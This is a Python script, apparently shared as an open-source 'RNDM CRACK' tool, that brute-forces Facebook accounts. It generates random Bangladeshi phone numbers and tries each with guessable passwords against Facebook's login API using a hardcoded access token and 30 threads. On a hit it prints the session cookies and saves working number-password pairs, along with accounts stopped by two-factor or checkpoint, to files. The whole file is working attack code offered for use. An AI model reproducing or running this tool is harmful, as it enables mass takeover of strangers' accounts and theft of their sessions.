#--------------------- [ INFO ] -------------------#
#DEVELOPER : TANIM HOSSAIN
#CODE BY : TANIM HOSSAIN
#OPEN SOURCE BY : BHOOT-X [TANIM HOSSAIN]
#TOOL : RNDM CHECK
#INJOY THE OPEN SOURCE 
#ALLAH HAFIZ
#--------------------- [ MODEL ] -------------------#
import os
import time
import sys
from os import path
import urllib
import pip
import base64
import zlib
from bs4 import BeautifulSoup as sop
from bs4 import BeautifulSoup
try:
        import os,requests,json,time,re,random,sys,uuid,string,subprocess
        from string import *
        from concurrent.futures import ThreadPoolExecutor as tred
except ModuleNotFoundError:
        os.system(f'pip install requests futures==2 > /dev/null')
except:pass
#--------------------- [ SEX ] -------------------#
jan = []
loop=0
oks=[]
cps=[]
twf=[]
#--------------------- [ CODE ] -------------------#
W='\033[1;37m' #WHITE
G='\033[38;5;46m'
F='\033[38;5;45m'
R='\033[38;5;196m'
#--------------------- [ LOGO ] -------------------#
fuck = """
88""Yb 88  88  dP"Yb   dP"Yb  888888 
88__dP 88  88 dP   Yb dP   Yb   88   
88""Yb 888888 Yb   dP Yb   dP   88   
88oodP 88  88  YbodP   YbodP    88   
===================================
[+] ADMIN : TANIM HOSSAIN
[+] GITHUB: BHOOT-X
[+] TOOL  : RNDM CRACK
[+] STATES: OPEN SOURCE
=================================== """
#--------------------- [ DEF-LOGO X CLEAR ] -------------------#
def x():
    os.system('clear')
    print(fuck)
#--------------------- [ DEF-XNXX ] -------------------#
def xnxx():
    print(f'{W}===================================')
#--------------------- [ MAIN ] -------------------#
def bhootxx():
    x()
    print('[1] RNDM CRACK')
    print('[2] EXIT');xnxx()
    xtx = input('[?] CHOICE : ')
    if xtx in '1':
        rndmx()
    elif xtx in '2':
        print('Allah hafiz ')
        os.system('exit')
#--------------------- [ RNDM ] -------------------#
def rndmx():
    x()
    print('[+] BD SIM CODE : 017,019,018,016 ');xnxx()
    dog = input('[?] CODE : ')
    x()
    try:
        print('[+] LIMIT : 999,9999,99999');xnxx()
        limit = int(input('[?] LIMIT : '))
    except ValueError:
            limit = 5000
    for nmbr in range(limit):
            xxx = ''.join(random.choice(string.digits) for _ in range(8))
            jan.append(xxx)
    with tred(max_workers=30) as tanox:
            x()
            tl = str(len(jan))
            print(f'[+] TOTAL UID : {str(len(jan))}')
            print(f'[+] USE JAPAN APN COMING MORE OK IDS.......');xnxx()
            for psx in jan:
                ids = dog+psx
                passlist = [psx,ids,ids[:8],ids[:7],'bangla']
                tanox.submit(sexx,ids,passlist)
    xnxx()
    print(f'[+] TOTAL OK -{str(len(oks))}')
    xnxx()
#--------------------- [ MTHD ] -------------------#
def sexx(ids,passlist):
        global loop
        global oks
        sys.stdout.write(f'\r\r[+] [BHOOT FIND] [{loop}] [OK:-{len(oks)}]')
        sys.stdout.flush()
        try:
                for pas in passlist:
                        accessToken = '350685531728|62f8ce9f74b12f84c123cc23437a4a32'
                        random_seed = random.Random()
                        adid = str(''.join(random_seed.choices(string.hexdigits, k=16)))
                        device_id = str(uuid.uuid4())
                        cat = {
                        
                        
                        
                        
                        
                                'adid':adid,
                                'format':'json',
                                'device_id':device_id,
                                'email':ids,
                                'password':pas,
                                'generate_analytics_claims':'1',
                                'credentials_type':'password',
                                'source':'login',                              
                                'error_detail_type':'button_with_disabled',                                
                                'enroll_misauth':'false',                             
                                'generate_session_cookies':'1',
                                'generate_machine_id':'1',
                                'fb_api_req_friendly_name':'authenticate',
                        }
                        
                        
                        
                        
                        
                        bhoot={
                        
                        
                        
                        
                        
                                'Authorization':f'OAuth {accessToken}',
                                'X-FB-Friendly-Name':'authenticate',
                                'X-FB-Connection-Type':'unknown',
                                'User-Agent':None,
                                'Accept-Encoding':'gzip, deflate',
                                'Content-Type': 'application/x-www-form-urlencoded',
                                'X-FB-HTTP-Engine': 'Liger'
                                }
                                
                                
                                
                                
                                
                        url = 'https://b-graph.facebook.com/auth/login'
                        twf = 'Login approval'+'s are on. '+'Expect an SMS'+' shortly with '+'a code to use'+' for log in'
                        po = requests.post(url,data=cat,headers=bhoot).json()
                        if 'session_key' in po:
                                try:
                                        uid = po['uid']
                                except:
                                        uid = ids
                                if str(uid) in oks:
                                        break
                                else:
                                        print(f'\r\r\033[38;5;46m[+] [BHOOT-OK] {str(uid)} \_/ {pas} ')
                                        fxxk = ";".join(i["name"]+"="+i["value"] for i in po["session_cookies"])
                                        print(f'=COOKIE= : {fxxk}')
                                        open('/sdcard/X-OK.txt','a').write(str(uid)+'|'+pas+'\n')
                                        oks.append(str(uid))
                                        break
                        elif twf in str(po):
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = idf
                                if uid in oks:pass
                                else:
                                        print(f'\r\r\033[38;5;45m[+] [BHOOT-2F] {uid} \_/ {pas}\033[1;37m')
                                        open('/sdcard/X-2F.txt','a').write(str(uid)+'|'+pas+'\n')
                                        twf.append(str(uid))
                                        break
                        elif 'www.facebook.com' in po['error']['message']:
                                try:
                                        uid = po['error']['error_data']['uid']
                                except:
                                        uid = ids
                                if uid in oks:pass
                                else:
                                        print('\r\r\033[38;5m196m[+] [BHOOT-CP] '+str(uid)+' \_/ '+pas+'\033[1;37m')
                                        open('/sdcard/X-CP.txt','a').write(str(uid)+'|'+pas+'\n')
                                        cps.append(str(ids))
                                        break
                        else:continue
                loop+=1
        except Exception as e:
                pass
#--------------------- [ END ] -------------------#
bhootxx()
